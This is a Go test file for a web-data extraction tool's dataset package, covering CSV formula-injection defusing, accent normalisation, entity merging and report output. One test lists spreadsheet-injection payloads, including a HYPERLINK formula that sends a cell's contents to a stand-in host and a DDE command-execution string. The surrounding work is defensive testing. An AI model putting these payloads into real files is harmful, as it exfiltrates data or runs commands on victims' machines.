package dataset_test

import (
	"bytes"
	"encoding/csv"
	"fmt"
	"strings"
	"testing"

	"github.com/lajosdeme/mole/internal/dataset"
)

// Regression tests for the M9 review.
//
// Both cases were found by probing rather than by reading, and both are mine: a
// CSV that a spreadsheet executes, and an accent table whose two halves had
// silently drifted apart.

// TestACellCannotBecomeAFormula.
//
// Excel, LibreOffice and Google Sheets evaluate a cell whose first character is
// =, +, - or @. mole extracts from arbitrary web pages into a file somebody opens
// in a spreadsheet, so this is the whole of that threat model — and every payload
// below reached the output untouched before the fix.
func TestACellCannotBecomeAFormula(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	payloads := []string{
		`=1+1`,
		`=HYPERLINK("http://evil.example?x="&A1,"click")`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
		`=cmd|' /C calc'!A0`,
	}
	var rows []dataset.Merged
	for _, p := range payloads {
		rows = append(rows, dataset.Merged{
			Cells: map[string]dataset.Cell{"company": {Text: p}},
		})
	}

	var buf bytes.Buffer
	d := dataset.Dataset{Schema: s, Rows: rows}
	if err := d.WriteCSV(&buf, false); err != nil {
		t.Fatal(err)
	}
	recs, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("not valid CSV: %v", err)
	}
	for i, rec := range recs[1:] {
		cell := rec[0]
		if cell == "" {
			t.Fatalf("row %d is empty", i)
		}
		if strings.ContainsRune("=+-@", rune(cell[0])) {
			t.Errorf("a spreadsheet would evaluate %q", cell)
		}
		// Defused, not destroyed: the value is still readable.
		if !strings.Contains(cell, strings.TrimPrefix(payloads[i], "=")) {
			t.Errorf("the value was mangled rather than defused: %q from %q",
				cell, payloads[i])
		}
	}
}

// TestAnOrdinaryValueIsNotPrefixed. The mitigation must not touch values that
// were never a formula, or every negative number in the dataset grows an
// apostrophe.
func TestAnOrdinaryValueIsNotPrefixed(t *testing.T) {
	s, _ := dataset.ParseSpec("company:text!,revenue:number")
	d := dataset.Dataset{Schema: s, Rows: []dataset.Merged{{
		Cells: map[string]dataset.Cell{
			"company": {Text: "Acme Ltd"},
			"revenue": {Text: "1200000"},
		},
	}}}
	var buf bytes.Buffer
	if err := d.WriteCSV(&buf, false); err != nil {
		t.Fatal(err)
	}
	recs, _ := csv.NewReader(&buf).ReadAll()
	if recs[1][0] != "Acme Ltd" || recs[1][1] != "1200000" {
		t.Errorf("an ordinary row was altered: %q", recs[1])
	}
}

// TestAccentsFoldToTheRightLetter.
//
// The table was two parallel strings, and they had drifted: 75 runes against 79,
// so every letter past the drift mapped to the wrong base and "Łódź" normalised to
// "dodz". Two parallel sequences whose correspondence nothing checks is the
// construct that caused it.
//
// Asserted through Normalise rather than against a copy of the table, so a test
// holding its own stale copy cannot pass while the code is wrong — which is
// exactly what the probe that found this did on the first run after the fix.
func TestAccentsFoldToTheRightLetter(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"Nestlé", "nestle"},
		{"Müller", "muller"},
		{"Škoda", "skoda"},
		{"Citroën", "citroen"},
		{"Åkerman", "akerman"},
		{"Łódź", "lodz"},
		{"Ćevapi", "cevapi"},
		{"Žofia", "zofia"},
		{"Coöperatie", "cooperatie"},
		{"Ångström", "angstrom"},
		{"Šiauliai", "siauliai"},
		{"Ærø", "aro"},
		{"Straße", "strase"},
		{"Danone", "danone"},
	} {
		if got := dataset.Normalise(tc.in); got != tc.want {
			t.Errorf("Normalise(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestAnAccentedNameMergesWithItsUnaccentedForm, which is the reason the table
// exists: a source that lost the accent must not become a second entity.
func TestAnAccentedNameMergesWithItsUnaccentedForm(t *testing.T) {
	s, _ := dataset.ParseSpec("company:text!,revenue:number")
	rows := []dataset.Row{
		{Values: map[string]string{"company": "Nestlé SA", "revenue": "1"},
			Source: "https://a.example"},
		{Values: map[string]string{"company": "Nestle S.A.", "revenue": "1"},
			Source: "https://b.example"},
		{Values: map[string]string{"company": "Łódź Holdings", "revenue": "2"},
			Source: "https://c.example"},
		{Values: map[string]string{"company": "Lodz Holdings", "revenue": "2"},
			Source: "https://d.example"},
	}
	d := dataset.Merge(s, rows, dataset.Options{})
	if len(d.Rows) != 2 {
		var got []string
		for _, r := range d.Rows {
			got = append(got, r.Get("company"))
		}
		t.Fatalf("rows = %d, want 2 — an accent split an entity: %v", len(d.Rows), got)
	}
}

// -----------------------------------------------------------------------------
// Second review pass
// -----------------------------------------------------------------------------

// TestADescriptionMayContainAComma.
//
// The compact schema form advertises free text after `=` and then split the whole
// spec on commas, so "revenue:number=annual revenue, in USD" became a second
// field named "in USD" — and the error a user got named a field they had not
// written.
func TestADescriptionMayContainAComma(t *testing.T) {
	s, err := dataset.ParseSpec(
		"company:text!=the company's registered name, as filed," +
			"revenue:number=annual revenue, in USD, most recent full year")
	if err != nil {
		t.Fatal(err)
	}
	if len(s.Fields) != 2 {
		t.Fatalf("fields = %d (%v), want 2", len(s.Fields), s.Names())
	}
	if got := s.Fields[0].Description; got != "the company's registered name, as filed" {
		t.Errorf("description 1 = %q", got)
	}
	if got := s.Fields[1].Description; got != "annual revenue, in USD, most recent full year" {
		t.Errorf("description 2 = %q", got)
	}
	if s.Fields[1].Type != dataset.TypeNumber {
		t.Errorf("type = %q, want number", s.Fields[1].Type)
	}
}

// TestADisagreementNamesTheSourcesBehindEachValue.
//
// The winning value carried its sources and the rivals did not, so the complete
// form said "revenue is 1.2m per sec.gov, or 1.35m" — and the CSV named the
// contested FIELD while showing one value, so a reader with only the CSV could not
// see what the disagreement was.
func TestADisagreementNamesTheSourcesBehindEachValue(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!,revenue:number")
	if err != nil {
		t.Fatal(err)
	}
	rows := []dataset.Row{
		{Values: map[string]string{"company": "Acme Ltd", "revenue": "1200000"},
			Source: "https://sec.gov/acme", Quote: "Acme Ltd reported revenue of $1.2m"},
		{Values: map[string]string{"company": "Acme Ltd", "revenue": "1350000"},
			Source: "https://blog.example/acme", Quote: "Acme Ltd made $1.35m last year"},
	}
	d := dataset.Merge(s, rows, dataset.Options{})
	if len(d.Rows) != 1 {
		t.Fatalf("rows = %d, want 1", len(d.Rows))
	}
	cell := d.Rows[0].Cells["revenue"]
	if len(cell.Others) != 1 {
		t.Fatalf("others = %+v, want the rival figure", cell.Others)
	}
	if got := cell.Others[0].Sources; len(got) != 1 || got[0] != "https://blog.example/acme" {
		t.Errorf("the rival value's sources = %v, want the blog that gave it", got)
	}

	// And the lossy form says it out loud, since it has one cell to do it in.
	var buf bytes.Buffer
	if err := d.WriteCSV(&buf, true); err != nil {
		t.Fatal(err)
	}
	recs, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	col := -1
	for i, h := range recs[0] {
		if h == "disagreements" {
			col = i
		}
	}
	if col < 0 {
		t.Fatalf("no disagreements column: %v", recs[0])
	}
	got := recs[1][col]
	for _, want := range []string{"revenue", "1200000", "sec.gov", "1350000", "blog.example"} {
		if !strings.Contains(got, want) {
			t.Errorf("disagreements cell %q does not mention %q", got, want)
		}
	}
}

// TestAQuoteCarriesTheOffsetItWasFoundAt.
//
// The offset was extracted, verified and stored per row, and then dropped at merge
// time — so nothing downstream could use it and an auditor re-fetching a page had
// to search it for a sentence that may appear twice.
func TestAQuoteCarriesTheOffsetItWasFoundAt(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Acme Ltd"}, Source: "https://a.example",
			Quote: "Acme Ltd was incorporated in 1998", QuoteOffset: 4096},
	}, dataset.Options{})
	q := d.Rows[0].Quotes["https://a.example"]
	if q.Offset != 4096 {
		t.Errorf("offset = %d, want 4096", q.Offset)
	}
	if q.Text == "" {
		t.Error("the quote text is gone")
	}
}

// TestTheSummaryOwnsUpToTheSpellingsItMerged.
//
// A row assembled from "Acme Ltd" and "Acme Limited" exists because the merge
// judged them one entity. The summary reported disagreements and said nothing
// about judgements, which are the decisions a reader would want to spot-check.
func TestTheSummaryOwnsUpToTheSpellingsItMerged(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Acme Ltd"}, Source: "https://a.example",
			Quote: "Acme Ltd exists"},
		{Values: map[string]string{"company": "Acme Limited"}, Source: "https://b.example",
			Quote: "Acme Limited exists"},
	}, dataset.Options{})
	if len(d.Rows) != 1 {
		t.Fatalf("rows = %d, want the two spellings merged", len(d.Rows))
	}
	if d.WithVariants() != 1 {
		t.Fatalf("WithVariants = %d, want 1", d.WithVariants())
	}
	if got := d.Summary(); !strings.Contains(got, "named the entity differently") {
		t.Errorf("the summary hides the merge's own judgement: %q", got)
	}
}

// TestAnUnquotedRowIsCounted.
//
// The eval's row-integrity metric is a hard regression and needs the number of
// extracted rows that carried no evidence. Only the merge sees them: after folding,
// a row's evidence is a per-source quote and the count is unrecoverable.
func TestAnUnquotedRowIsCounted(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Acme Ltd"}, Source: "https://a.example",
			Quote: "Acme Ltd exists"},
		{Values: map[string]string{"company": "Beta GmbH"}, Source: "https://b.example"},
	}, dataset.Options{})
	if d.Unquoted != 1 {
		t.Errorf("unquoted = %d, want 1", d.Unquoted)
	}
}

// TestASuffixOnlyKeyKeepsItsTokens.
//
// splitSuffixes strips a trailing run of legal-form words, and a value that is
// nothing BUT legal-form words would normalise to the empty string — which the
// merge drops as unkeyed. Keeping the tokens reports the bad row instead of losing
// it.
func TestASuffixOnlyKeyKeepsItsTokens(t *testing.T) {
	if got := dataset.Normalise("Ltd"); got != "ltd" {
		t.Errorf("Normalise(%q) = %q, want the tokens kept", "Ltd", got)
	}
	if got := dataset.Normalise("Holdings Group"); got != "holdings group" {
		t.Errorf("Normalise(%q) = %q, want the tokens kept", "Holdings Group", got)
	}
	// And the ordinary case still strips.
	if got := dataset.Normalise("Acme Holdings Ltd"); got != "acme" {
		t.Errorf("Normalise = %q, want %q", got, "acme")
	}
}

// TestALeadingLegalFormWordIsNotASuffix.
//
// The table contains short words that are ordinary LEADING words in other names —
// as, se, co, ab, lp, kk — and stripping wherever they appeared turned "AS Bank"
// into "bank" and "The Company" into "the".
func TestALeadingLegalFormWordIsNotASuffix(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"AS Bank", "as bank"},
		{"Co-operative Bank", "co operative bank"},
		{"SE Banken", "se banken"},
	} {
		if got := dataset.Normalise(tc.in); got != tc.want {
			t.Errorf("Normalise(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestTwoDifferentLegalFormsDoNotMerge, the precision side of the family rule:
// "Acme Holdings" and "Acme Group" both reduce to "acme".
func TestTwoDifferentLegalFormsDoNotMerge(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Acme Holdings"}, Source: "https://a.example",
			Quote: "Acme Holdings exists"},
		{Values: map[string]string{"company": "Acme Group"}, Source: "https://b.example",
			Quote: "Acme Group exists"},
	}, dataset.Options{})
	if len(d.Rows) != 2 {
		t.Errorf("rows = %d, want 2: two legal forms, two entities", len(d.Rows))
	}
}

// TestSimilarityRefusesASharedFirstWord — the negative side of the token rule,
// which the ground-truth measure covers in aggregate and nothing pinned directly.
func TestSimilarityRefusesASharedFirstWord(t *testing.T) {
	for _, tc := range []struct {
		a, b string
		want bool
	}{
		{"acme", "acme bakery", false},
		{"deutsche bank", "deutsche telekom", false},
		{"deutsche bank", "deutsche bnak", true},
		{"british airways", "airways british", true},
		{"jp morgan", "jpmorgan", true},
	} {
		got := dataset.Similarity(tc.a, tc.b) >= dataset.DefaultThreshold
		if got != tc.want {
			t.Errorf("Similarity(%q, %q) = %.3f, want match=%v",
				tc.a, tc.b, dataset.Similarity(tc.a, tc.b), tc.want)
		}
	}
}

// TestMarkdownMarksAContestedValueAndCapsTheTable.
//
// The stored report is what an MCP caller and a terminal reader see, and neither
// opens the JSON. It had no test at all.
func TestMarkdownMarksAContestedValueAndCapsTheTable(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!,revenue:number")
	if err != nil {
		t.Fatal(err)
	}
	rows := []dataset.Row{
		{Values: map[string]string{"company": "Acme Ltd", "revenue": "1200000"},
			Source: "https://a.example", Quote: "Acme Ltd reported $1.2m"},
		{Values: map[string]string{"company": "Acme Ltd", "revenue": "1350000"},
			Source: "https://b.example", Quote: "Acme Ltd made $1.35m"},
	}
	// Enough distinct entities to exceed the cap.
	for i := 0; i < dataset.MarkdownRows+5; i++ {
		name := fmt.Sprintf("Filler%d Industries", i)
		rows = append(rows, dataset.Row{
			Values: map[string]string{"company": name, "revenue": "100"},
			Source: "https://c.example", Quote: name + " reported 100"})
	}
	got := dataset.Markdown(dataset.Merge(s, rows, dataset.Options{}))

	if !strings.Contains(got, "⚠") {
		t.Error("a contested value is not marked in the table")
	}
	if !strings.Contains(got, "rows shown") {
		t.Error("the cap is silent; a reader cannot tell rows are missing")
	}
	if n := strings.Count(got, "\n| "); n > dataset.MarkdownRows+2 {
		t.Errorf("%d table lines, want the cap to bind", n)
	}
	if !strings.Contains(got, "|") || !strings.Contains(got, "company") {
		t.Error("no table header")
	}
}

// TestAPipeInAValueDoesNotBreakTheTable.
func TestAPipeInAValueDoesNotBreakTheTable(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	got := dataset.Markdown(dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Acme | Beta"}, Source: "https://a.example",
			Quote: "Acme | Beta exists"},
	}, dataset.Options{}))
	if !strings.Contains(got, `Acme \| Beta`) {
		t.Errorf("the pipe is not escaped: %q", got)
	}
}

// TestACountryQualifierDoesNotSplitAnEntity.
//
// From a live run over real supermarket data: "Aldi" and "Aldi UK" became two rows
// with half the figures each, as did "Lidl" and "Lidl GB" — three of eleven rows
// split on a country qualifier. The constructed ground-truth set contained no case
// like it, which is why the measure read 1.000 while real data was 27% duplicated.
func TestACountryQualifierDoesNotSplitAnEntity(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!,revenue:number")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Aldi"}, Source: "https://a.example",
			Quote: "Aldi operates over 1,000 stores in the UK"},
		{Values: map[string]string{"company": "Aldi UK", "revenue": "17900000000"},
			Source: "https://b.example", Quote: "Aldi UK reported revenue of £17.9bn"},
		{Values: map[string]string{"company": "Lidl GB", "revenue": "11000000000"},
			Source: "https://c.example", Quote: "Lidl GB reported revenue of £11bn"},
		{Values: map[string]string{"company": "Lidl"}, Source: "https://d.example",
			Quote: "Lidl continues to expand its British estate"},
	}, dataset.Options{})

	if len(d.Rows) != 2 {
		var names []string
		for _, r := range d.Rows {
			names = append(names, r.Get("company"))
		}
		t.Fatalf("%d rows (%v), want 2 — a country qualifier split an entity",
			len(d.Rows), names)
	}
	// And the figure lands on the merged row rather than being stranded on the
	// qualified spelling, which is what made the live output useless: the
	// corroborated row was the one with no revenue in it.
	for _, r := range d.Rows {
		if r.Get("revenue") == "" {
			t.Errorf("row %q has no revenue; the value was stranded on the other spelling",
				r.Get("company"))
		}
	}
}

// TestTwoDifferentCountriesStillDoNotMerge. The family rule is what makes the
// qualifier safe to strip: "Aldi UK" and "Aldi US" are different entities.
func TestTwoDifferentCountriesStillDoNotMerge(t *testing.T) {
	s, err := dataset.ParseSpec("company:text!")
	if err != nil {
		t.Fatal(err)
	}
	d := dataset.Merge(s, []dataset.Row{
		{Values: map[string]string{"company": "Aldi UK"}, Source: "https://a.example",
			Quote: "Aldi UK reported revenue of £17.9bn"},
		{Values: map[string]string{"company": "Aldi US"}, Source: "https://b.example",
			Quote: "Aldi US operates in 38 states of America"},
	}, dataset.Options{})
	if len(d.Rows) != 2 {
		t.Errorf("%d row(s), want 2 — two countries are two entities", len(d.Rows))
	}
}

// TestALeadingCountryWordIsNotAQualifier. "US Foods" and "UK Power Networks" are
// companies whose name STARTS with the token, and splitSuffixes is trailing-only —
// but the table grew, so the property is pinned rather than assumed.
func TestALeadingCountryWordIsNotAQualifier(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"US Foods", "us foods"},
		{"UK Power Networks", "uk power networks"},
		{"India Cements", "india cements"},
	} {
		if got := dataset.Normalise(tc.in); got != tc.want {
			t.Errorf("Normalise(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
